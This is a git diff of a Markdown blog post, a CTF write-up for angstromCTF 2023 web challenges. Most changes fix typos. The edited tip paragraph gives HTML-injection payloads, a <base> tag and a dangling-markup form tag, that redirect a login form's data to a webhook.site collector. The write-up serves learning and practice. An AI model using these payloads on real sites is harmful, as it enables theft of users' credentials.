@@ -1,15 +1,15 @@
 ---
-title: AngstormCTF 2023 Writeups for web exploitation Part 2
+title: AngstromCTF 2023 Writeups for web exploitation Part 2
 date: 2023-04-28 21:20:00 +/-0200
 categories: [CTF writeup, Web exploitaion]
-tags: [medium, angstormctf, http headers, xss, ssti, dangling markup attack]
+tags: [medium, angstromctf, http headers, xss, ssti, dangling markup attack]
 image:
-  path: /assets/img/AngstormPage.png
-  alt:  AngstormCTF 2023
+  path: /assets/img/angstromPage.png
+  alt:  angstromCTF 2023
 ---
 
 
-Hello everyone!, here is the 2nd part of my writeups for angstormCTF 2023, **Let's dive into it!**
+Hello everyone!, here is the 2nd part of my writeups for angstromCTF 2023, **Let's dive into it!**
 
 ## 5. Celeste Tunneling Association
 ---
@@ -25,7 +25,7 @@ Hello everyone!, here is the 2nd part of my writeups for angstormCTF 2023, **Let
 
 
 ### Solution
-
+---
 Not much to see on the website, We just get this message
 
 ![filer message](/assets/img/CelesteTunnelingAssociation1.png){: .shadow  }
@@ -103,7 +103,7 @@ And there you get the flag!
 
 
 ### Solution
-
+---
 Looking at the homepage of the challenge we see that we can make a card using some images/svgs, or text!
 
 ![hallmark hompage](/assets/img/Hallmark1.png){: .shadow  }
@@ -325,7 +325,7 @@ Now we provide the URL with our card id to the admin bot, and verify (to a bot:)
 
 
 ### Solution
-
+---
 First, let's look at the website
 
 ![brokenlogin homepage](/assets/img/Brokenlogin1.png){: .shadow  }
@@ -470,7 +470,9 @@ Now we provide the URL to the admin bot and go to our webhook site and there we 
 
 And then URL decoding it to get the flag!
 
-> Instead of providing full form as we did, we could instead either inject `<base href='http://webhook.site/your_webhook_id'>`, this is possible here because the path in the action attribute is not the full path with the website like, so this <base> tag tells the form that for any data you send the base url or the host will be our webhook site, the other way is to do Dangling Markup Attack, this can be done by injecting `<form action='http://webhook.site/your_webhook_id'> x="`, what this does is that the open quote of the fake x attribute will consider anything that comes after it as a string until the next quote, effectively eating up the form tag and its action attribute that is provided by the actual form and the form!!, read more about this attack from this [HackTricks](https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection) article
+> Instead of providing full form as we did, we could instead inject `<base href='http://webhook.site/your_webhook_id'>`, this is possible here because the path in the action attribute is not the full path with the website, this <base> tag tells the form that for any form data you send the base url or the host will be this url of the webhook site, another way is to do Dangling Markup Attack, this can be done by injecting `<form action='http://webhook.site/your_webhook_id' x="`, what this does is that the open quote of the fake x attribute will consider anything that comes after it as a string until the next quote, effectively eating up the form tag and its action attribute that is provided by the actual form and the form!!, read more about this attack from this [HackTricks](https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection) article
 {: .prompt-info }
 
 #### Learned: `SSTI`,`HTML Injection`,`Dangling Markup Attack`, `XSS`
+---
+**To be continued in part 3 for the last challange!**
